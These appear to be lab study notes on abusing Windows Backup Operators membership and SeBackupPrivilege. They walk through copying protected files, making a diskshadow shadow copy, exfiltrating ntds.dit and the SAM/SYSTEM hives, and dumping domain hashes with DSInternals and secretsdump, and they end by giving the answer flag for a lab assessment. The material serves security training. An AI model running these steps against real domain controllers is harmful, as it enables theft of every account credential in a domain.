# Windows Built-in Groups

{% embed url="https://ss64.com/nt/syntax-security_groups.html" %}
listing of all built-in Windows groups
{% endembed %}

{% embed url="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory" %}
listing of privileged accounts and groups in Active Directory
{% endembed %}

## Backup Operators

Members of this group can grant `SeBackup` and `SeRestore` privileges to its members, This group has SeBackupPrivilege which allows us to list any folder contents without being in the ACL. We can't use a copy command but have to programmatically copy the data.

{% embed url="https://github.com/giuliano108/SeBackupPrivilege" %}
Use SeBackupPrivilege to access objects you shouldn't have access
{% endembed %}

**Importing Libraries**

```powershell-session
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

**Verifying SeBackupPrivilege is Enabled**

```powershell-session
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

```powershell-session
PS C:\htb> Get-SeBackupPrivilege

SeBackupPrivilege is disabled
```

**Enabling SeBackupPrivilege**

```powershell-session
PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Get-SeBackupPrivilege

SeBackupPrivilege is enabled
```

```powershell-session
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

**Copying a Protected File**

```powershell-session
PS C:\htb> dir C:\Confidential\

    Directory: C:\Confidential

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/6/2021   1:01 PM             88 2021 Contract.txt


PS C:\htb> cat 'C:\Confidential\2021 Contract.txt'

cat : Access to the path 'C:\Confidential\2021 Contract.txt' is denied.
At line:1 char:1
+ cat 'C:\Confidential\2021 Contract.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Confidential\2021 Contract.txt:String) [Get-Content], Unauthor
   izedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

```powershell-session
PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

Copied 88 bytes


PS C:\htb>  cat .\Contract.txt

Inlanefreight 2021 Contract

==============================

Board of Directors:

<...SNIP...
```

**Attacking a Domain Controller - Copying NTDS.dit**

This group can login locally to DC and we can try to get NTDS.dit which stores the NTLM hashes for all computers and users in the domain.

NTDS.dit is locked by default use the following utility to create a copy of C drive and expose it as E drive. Then we can read the files since the system won't be using the copy

{% embed url="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow" %}
diskshadow.exe
{% endembed %}

```powershell-session
PS C:\htb> diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

PS C:\htb> dir E:


    Directory: E:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   1:00 PM                Confidential
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---        3/24/2021   6:20 PM                Program Files
d-----        9/15/2018   2:06 AM                Program Files (x86)
d-----         5/6/2021   1:05 PM                Tools
d-r---         5/6/2021  12:51 PM                Users
d-----        3/24/2021   6:38 PM                Windows
```

**Copying NTDS.dit Locally**

```powershell-session
PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

Copied 16777216 bytes
```

**Backing up SAM and SYSTEM Registry Hives**

to extract local account credentials offline using a tool such as Impacket's `secretsdump.py`

```cmd-session
C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV

The operation completed successfully.


C:\htb> reg save HKLM\SAM SAM.SAV

The operation completed successfully.
```

**Extracting Credentials from NTDS.dit**

use a tool such as `secretsdump.py` or the PowerShell `DSInternals` module to extract all Active Directory account credentials

```powershell-session
PS C:\htb> Import-Module .\DSInternals.psd1
PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

Get just the `administrator` account for the domain using `DSInternals`

&#x20;**Extracting Hashes Using SecretsDump**

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0xc0a9116f907bd37afaaa845cb87d0550
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 85541c20c346e3198a3ae2c09df7f330
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WINLPE-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7abf052dcef31f6305f1d4c84dfa7484:::
. . .
```

### Robocopy

**Copying Files with Robocopy**

Robocopy is a command-line directory replication tool.

```cmd-session
C:\htb> robocopy /B E:\Windows\NTDS .\ntds ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, May 6, 2021 1:11:47 PM
   Source : E:\Windows\NTDS\
     Dest : C:\Tools\ntds\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

          New Dir          1    E:\Windows\NTDS\
100%        New File              16.0 m        ntds.dit

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         1         0         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   16.00 m   16.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           356962042 Bytes/sec.
   Speed :           20425.531 MegaBytes/min.
   Ended : Thursday, May 6, 2021 1:11:47 PM
```

## Assessment

**Leverage SeBackupPrivilege rights and obtain the flag located at c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt**

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption><p>enable the privilege using Set-SeBackupPrivilege</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption><p>As seen we can traverse to the directory but unable to read the contents of the file.</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (114).png" alt=""><figcaption><p>Car3ful_w1th_gr0up_m3mberSh1p!</p></figcaption></figure>
